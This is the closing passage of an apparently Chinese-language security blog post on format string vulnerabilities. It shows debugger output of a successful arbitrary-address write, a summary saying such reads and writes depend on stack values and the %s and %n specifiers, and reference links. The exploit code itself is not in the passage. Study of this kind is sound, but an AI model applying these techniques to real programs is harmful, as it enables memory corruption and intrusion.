+what&#39;s your name?
+aa                                            ...1BBBBBBB12345678�����===1BBBBBBB12345678�����[Inferior 1 (process 3924) exited normally]</code></pre>
+<p>如上可见，原本我们输入的时候 === 后面是 B ，现在被改成了 1 ，任意地址写入成功</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这个类型的漏洞，主要是可变长参数的支持，以及在格式化字符串（解析第一实参）过程中，格式化字符串可以由 client 控制</p>
+<p><strong>任意地址的读 / 写，都是依赖栈中值 + <code>%s</code> 与 <code>%n</code> 控制符的特殊性</strong></p>
+<p>不知其他类型支持可变长参数的函数会不会出问题呢？毕竟函数调用约定最终需要用栈来传递参数emmm</p>
+<p><a href="https://bbs.pediy.com/thread-253638.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253638.htm</a></p>
+<p><a href="https://bbs.pediy.com/thread-253638.htm" target="_blank" rel="noopener">格式化字符串漏洞简介</a></p>
+<p>可变长参数资料：</p>
+<p><a href="https://blog.csdn.net/hmxz2nn/article/details/80445770" target="_blank" rel="noopener">https://blog.csdn.net/hmxz2nn/article/details/80445770</a></p>
+<p><a href="https://www.cnblogs.com/qq329914874/p/5995044.html" target="_blank" rel="noopener">https://www.cnblogs.com/qq329914874/p/5995044.html</a></p>
+<p><a href="https://www.cnblogs.com/qq329914874/p/5990316.html" target="_blank" rel="noopener">https://www.cnblogs.com/qq329914874/p/5990316.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-格式控制符的使用"><span class="toc-number">3.</span> <span class="toc-text">0x03 格式控制符的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-s"><span class="toc-number">3.1.</span> <span class="toc-text">a. %s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b-n"><span class="toc-number">3.2.</span> <span class="toc-text">b. %n</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-利用技巧"><span class="toc-number">3.3.</span> <span class="toc-text">c. 利用技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-尝试利用"><span class="toc-number">4.</span> <span class="toc-text">0x04 尝试利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-总结"><span class="toc-number">5.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/12/14/format-string-vuln/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/12/14/format-string-vuln/&text=format string vuln" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/12/14/format-string-vuln/&is_video=false&description=format string vuln" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=format string vuln&body=Check out this article: http://yoursite.com/2019/12/14/format-string-vuln/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/12/14/format-string-vuln/&name=format string vuln&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2019/12/14/format-string-vuln/&t=format string vuln" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 zndetcl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
